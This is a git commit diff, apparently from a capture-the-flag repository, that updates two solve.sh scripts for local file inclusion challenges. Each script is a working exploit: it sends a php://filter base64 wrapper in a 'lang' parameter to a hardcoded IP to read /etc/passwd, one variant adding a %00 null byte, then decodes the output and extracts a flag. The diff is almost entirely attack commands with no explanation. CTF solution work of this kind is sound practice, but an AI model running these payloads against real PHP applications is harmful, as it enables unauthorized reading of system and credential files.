ea22d4ee900309db9ba71b2436d6d707cc25a71b
Victor CUTILLAS <victor.cutillas@epitech.eu>
2018-02-26 14:13:57 +0100

    Updated LFI scripts, isolating flags

--- lfi-easy/solve.sh
+++ lfi-easy/solve.sh
@@ -1,3 +1,6 @@
 #!/bin/bash
 
-curl -kv 'https://46.105.49.65/05ee21b521fe/?lang=php://filter/convert.base64-encode/resource=/etc/passwd' | head -n 1 | base64 -d
+curl -sk 'https://46.105.49.65/05ee21b521fe/?lang=php://filter/convert.base64-encode/resource=/etc/passwd' \
+    | head -n 1 \
+    | base64 -d \
+    | grep -oE '[0-9a-f]{128}'
--- lfi-null/solve.sh
+++ lfi-null/solve.sh
@@ -1,3 +1,6 @@
 #!/bin/bash
 
-curl -vk https://46.105.49.65/916eba03a2d2/?lang=php://filter/convert.base64-encode/resource=/etc/passwd%00 | head -n 1 | base64 -d
+curl -sk https://46.105.49.65/916eba03a2d2/?lang=php://filter/convert.base64-encode/resource=/etc/passwd%00 \
+    | head -n 1 \
+    | base64 -d \
+    | grep -oE '[0-9a-f]{128}'
